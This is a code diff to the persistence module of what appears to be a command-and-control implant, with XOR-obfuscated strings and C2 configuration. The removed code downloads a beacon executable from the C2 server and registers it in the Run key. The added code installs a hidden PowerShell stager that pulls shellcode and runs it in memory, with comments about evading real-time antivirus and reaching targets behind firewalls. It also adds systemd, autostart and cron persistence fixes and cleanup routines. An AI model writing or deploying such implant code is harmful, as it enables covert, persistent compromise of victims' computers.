@@ -2,6 +2,7 @@
 
 #include "evasion.h"
 #include "network.h"
+#include "persistence_startup.h"
 #include <string>
 #include <vector>
 
@@ -22,67 +23,94 @@ namespace persistence {
 #ifdef _WIN32
 
 inline std::string establish_windows(const net::C2Config& cfg, const std::string& name) {
-    char appdata[MAX_PATH];
-    DWORD appdataLen = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
-    if (appdataLen == 0 || appdataLen >= sizeof(appdata)) {
-        return std::string(XOR_DEC(XOR_STR("Error: %APPDATA% not available")));
-    }
-
-    std::string dir = std::string(appdata) + "\\Microsoft\\Phantom";
-    std::string exePath = dir + "\\" + name + ".exe";
-
-    CreateDirectoryA(dir.c_str(), NULL);
-
-    // Download full beacon PE from C2
-    std::string payload = net::http_request(cfg,
-        XOR_WDEC(XOR_WSTR(L"GET")).c_str(),
-        XOR_WDEC(XOR_WSTR(L"/api/v1/payload")).c_str(), "", "");
-    if (payload.empty()) {
-        return std::string("Error: Failed to download beacon PE from C2 (host=")
-            + std::string(cfg.host.begin(), cfg.host.end()) + ":"
-            + std::to_string(cfg.port) + ")";
-    }
-
-    // Save beacon PE to disk
-    HANDLE hFile = CreateFileA(exePath.c_str(), GENERIC_WRITE, 0, NULL,
-                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        return std::string(XOR_DEC(XOR_STR("Error: Failed to write beacon to "))) + exePath;
-    }
-    DWORD written = 0;
-    WriteFile(hFile, payload.data(), (DWORD)payload.size(), &written, NULL);
-    CloseHandle(hFile);
-
-    // Run it once to establish the hollowed child
-    std::string runCmd = std::string("\"") + exePath + "\"";
-    STARTUPINFOA si = { sizeof(si) };
-    PROCESS_INFORMATION pi = {};
-    if (CreateProcessA(NULL, &runCmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-    }
-
-    // Create Run key so it starts on next login
-    HKEY hKey;
-    if (RegCreateKeyExA(HKEY_CURRENT_USER,
-            XOR_DEC(XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
-            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        runCmd = std::string("\"") + exePath + "\"";
-        if (RegSetValueExA(hKey, name.c_str(), 0, REG_SZ,
-                (const BYTE*)runCmd.c_str(), (DWORD)runCmd.size() + 1) == ERROR_SUCCESS) {
+    // ── Strategy 1: NO-DISK persistence (preferred) ────────────────────
+    // The RunKey relaunches the compact PowerShell stager (embedded at
+    // build time). At next logon: powershell downloads the XOR PIC from
+    // /x and executes it in-memory — no EXE ever touches the disk, the
+    // exact path that field-testing proved survives real-time AV.
+#ifdef C2_HAS_PS_STAGER
+    {
+        HKEY hKey = NULL;
+        if (RegCreateKeyExA(HKEY_CURRENT_USER,
+                XOR_DEC(XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
+                0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            std::string runCmd = std::string("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc ")
+                + C2_PS_STAGER_B64;
+            if (RegSetValueExA(hKey, name.c_str(), 0, REG_SZ,
+                    (const BYTE*)runCmd.c_str(), (DWORD)runCmd.size() + 1) == ERROR_SUCCESS) {
+                RegCloseKey(hKey);
+                return std::string("Persist established (no-disk): RunKey ")
+                    + name + " -> powershell stager (in-memory rebirth at logon)";
+            }
             RegCloseKey(hKey);
-            return std::string("Persist established: RunKey -> ") + runCmd
-                + XOR_DEC(XOR_STR("\nThe beacon PE is saved to disk. On next login it will self-hollow into RuntimeBroker.")).c_str();
         }
+    }
+#endif
+
+    // Strategy 2: no-admin, no-PE Startup script.
+    // Like every pull-based persistence, this needs the target to reach
+    // C2_HOST at logon; a target behind NAT/firewall (e.g. Beijing) needs a
+    // public staging relay or a pre-staged deliverable, never 0.0.0.0.
+    return establish_windows_startup(cfg, name);
+}
+
+// ── Removal: undo exactly what establish_windows created ───────────────────
+// Strategy 1 = RunKey value; strategy 2 = per-user Startup .cmd. The legacy
+// on-disk copy is still removed for hosts cleaned after an older build. No
+// C2 round-trip is involved (nothing to download).
+inline std::string remove_windows(const std::string& name) {
+    std::string results;
+
+    // 1) Run key value (strategy 1)
+    HKEY hKey = NULL;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+            XOR_DEC(XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(),
+            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        if (RegDeleteValueA(hKey, name.c_str()) == ERROR_SUCCESS)
+            results += "RunKey value removed: " + name + "\n";
         RegCloseKey(hKey);
-        return std::string(XOR_DEC(XOR_STR("Error: Failed to set Registry value")));
     }
 
-    return std::string(XOR_DEC(XOR_STR("Error: Failed to open/create Registry key")));
+    // 2) Startup script (strategy 2) and legacy on-disk copy
+    char appdata[MAX_PATH];
+    DWORD len = GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata));
+    if (len > 0 && len < sizeof(appdata)) {
+        std::string startupDir = std::string(appdata) +
+            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
+        std::string lnk = startupDir + name + ".lnk";
+        if (DeleteFileA(lnk.c_str()) == TRUE)
+            results += "Removed Startup shortcut: " + lnk + "\n";
+        std::string cmd = startupDir + name + ".cmd";
+        if (DeleteFileA(cmd.c_str()) == TRUE)
+            results += "Removed Startup script: " + cmd + "\n";
+        std::string dir = std::string(appdata) + "\\Microsoft\\Phantom";
+        std::string exePath = dir + "\\" + name + ".exe";
+        if (DeleteFileA(exePath.c_str()) == TRUE)
+            results += "Removed on-disk copy: " + exePath + "\n";
+        RemoveDirectoryA(dir.c_str());   // only succeeds when it is now empty
+    }
+
+    if (results.empty())
+        return std::string("Unpersist: nothing to remove for '") + name + "'";
+    return std::string("Persistence removed:\n") + results;
 }
 
 // ── Linux persistence (systemd + .desktop + cron) ────────────────────────────
 #elif defined(__linux__)
+
+// Recursive mkdir (mkdir -p): the single-level mkdir() failed silently when
+// ~/.config/systemd did not exist yet, so the user-service arm of Linux
+// persistence never installed (live test 2026-10-19: persist reported only
+// [autostart] + [cron]). Recreate every missing parent.
+inline void mkdir_p(const std::string& path) {
+    std::string cur;
+    for (size_t i = 0; i < path.size(); ++i) {
+        cur += path[i];
+        if (path[i] == '/' || i + 1 == path.size()) {
+            if (cur != "/" && !cur.empty()) mkdir(cur.c_str(), 0755);
+        }
+    }
+}
 
 inline std::string establish_linux(const std::string& name) {
     char buf[1024];
@@ -97,7 +125,7 @@ inline std::string establish_linux(const std::string& name) {
 
     // Copy binary to ~/.local/bin/ so it survives /tmp/ cleanup
     std::string installDir = home + "/.local/bin";
-    mkdir(installDir.c_str(), 0755);
+    mkdir_p(installDir);
     std::string installPath = installDir + "/" + exeName;
     std::ifstream src(curPath, std::ios::binary);
     std::ofstream dst(installPath, std::ios::binary);
@@ -111,7 +139,7 @@ inline std::string establish_linux(const std::string& name) {
 
     // 1) systemd user service
     std::string systemdDir = home + "/.config/systemd/user";
-    mkdir(systemdDir.c_str(), 0755);
+    mkdir_p(systemdDir);
     std::string serviceFile = systemdDir + "/" + name + ".service";
     {
         std::ofstream ofs(serviceFile);
@@ -137,7 +165,7 @@ inline std::string establish_linux(const std::string& name) {
 
     // 2) .desktop autostart (for desktop environments)
     std::string autostartDir = home + "/.config/autostart";
-    mkdir(autostartDir.c_str(), 0755);
+    mkdir_p(autostartDir);
     std::string desktopFile = autostartDir + "/" + name + ".desktop";
     {
         std::ofstream ofs(desktopFile);
@@ -245,6 +273,77 @@ inline std::string establish_linux(const std::string& name) {
     return XOR_DEC(XOR_STR("Native persistence (cron) established: ")).c_str() + installPath;
 }
 
+#endif
+
+// ── Removal (Linux / macOS): undo exactly what establish_linux created ─────
+#ifndef _WIN32
+inline std::string remove_posix(const std::string& name) {
+    std::string results;
+    std::string home = getenv("HOME") ? getenv("HOME") : "";
+
+    // The installed copy is ~/.local/bin/<exeName> (or /data/local/tmp on the
+    // cron-only fallback): derive the same name establish_linux used.
+    std::string exeName;
+    {
+        char buf[1024];
+        ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
+        if (len != -1) {
+            buf[len] = '\0';
+            std::string self(buf);
+            exeName = self.substr(self.find_last_of('/') + 1);
+        }
+    }
+    std::string installPath = home.empty()
+        ? (std::string("/data/local/tmp/") + exeName)
+        : (home + "/.local/bin/" + exeName);
+
+#ifdef __APPLE__
+    // LaunchAgent plist, same path establish_linux wrote on macOS
+    if (home.empty()) return std::string("Error: Could not find HOME directory");
+    std::string plist = home + "/Library/LaunchAgents/com." + name + ".plist";
+    std::string unloadCmd = "launchctl unload " + plist + " 2>/dev/null";
+    FILE* fp = popen(unloadCmd.c_str(), "r");
+    if (fp) pclose(fp);
+    if (remove(plist.c_str()) == 0)
+        results += "[LaunchAgent] removed " + plist + "\n";
+#else
+    if (!home.empty()) {
+        // systemd user service
+        std::string serviceFile = home + "/.config/systemd/user/" + name + ".service";
+        std::string stopCmd = "systemctl --user stop " + name + ".service 2>/dev/null";
+        std::string disableCmd = "systemctl --user disable " + name + ".service 2>/dev/null";
+        FILE* fp = popen(stopCmd.c_str(), "r");
+        if (fp) pclose(fp);
+        fp = popen(disableCmd.c_str(), "r");
+        if (fp) pclose(fp);
+        if (remove(serviceFile.c_str()) == 0)
+            results += "[systemd] removed " + serviceFile + "\n";
+
+        // .desktop autostart
+        std::string desktopFile = home + "/.config/autostart/" + name + ".desktop";
+        if (remove(desktopFile.c_str()) == 0)
+            results += "[autostart] removed " + desktopFile + "\n";
+    }
+#endif
+
+    // cron line: drop the exact installed path, keep every other job, so a
+    // removal never silences the operator's own scheduled work.
+    if (!exeName.empty()) {
+        std::string cronCmd = "crontab -l 2>/dev/null | grep -v -F '" +
+            installPath + "' | crontab - 2>/dev/null";
+        FILE* fp = popen(cronCmd.c_str(), "r");
+        if (fp) pclose(fp);
+        results += "[cron] removed entries for " + installPath + "\n";
+
+        // the beacon copy that persist dropped in ~/.local/bin
+        if (!home.empty() && remove(installPath.c_str()) == 0)
+            results += "[copy] removed " + installPath + "\n";
+    }
+
+    if (results.empty())
+        return std::string("Unpersist: nothing to remove for '") + name + "'";
+    return std::string("Persistence removed:\n") + results;
+}
 #endif
 
 } // namespace persistence
